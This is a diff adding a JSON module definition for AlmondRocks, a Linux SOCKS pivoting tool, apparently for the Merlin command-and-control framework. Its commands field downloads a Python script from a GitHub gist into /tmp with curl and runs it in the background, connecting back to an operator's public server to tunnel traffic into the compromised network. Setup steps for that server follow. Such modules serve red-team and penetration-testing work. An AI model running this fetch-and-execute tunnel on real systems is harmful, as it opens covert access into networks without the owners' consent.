@@ -1,0 +1,30 @@
+{
+  "base": {
+    "name": "AlmondRocks",
+    "type": "standard",
+    "author": ["Kevin Lustic"],
+    "path": ["linux", "x64", "python", "pivoting", "arox.json"],
+    "platform": "linux",
+    "arch": "x64",
+    "lang": "python",
+    "privilege": false,
+    "remote": "https://gist.githubusercontent.com/klustic/14efac58264f5a3f082f8b2731b21c93/raw/459c81af93f78c8f155cbcf16e145d4be62da972/arox.py",
+    "options": [
+      {"name": "host", "value": "", "required": true, "description":"The AlmondRocks server, specified as <IP|Domain>:<Port>"}
+    ],
+    "description": "AlmondRocks (arox) connects out to a public-facing server to tunnel SOCKSv5-wrapped comms in.",
+    "notes": "https://github.com/klustic/AlmondRocks",
+    "commands": [
+      "/bin/bash",
+      "-c",
+      "\"curl -vk -Lo /tmp/arox.py https://gist.githubusercontent.com/klustic/14efac58264f5a3f082f8b2731b21c93/raw/459c81af93f78c8f155cbcf16e145d4be62da972/arox.py; /usr/bin/python /tmp/arox.py {{host}} &\";"
+    ]
+  },
+  "additionalInstructions": {
+    "Setup": [
+      "1. Download AlmondRocks server to a publicly accessible host: https://github.com/klustic/AlmondRocks",
+      "2. Follow the README for AlmondRocks to setup the server"
+    ],
+    "Comments": "The additionalInstructions tag is ignored by Merlin and are for user consumption only."
+  }
+}
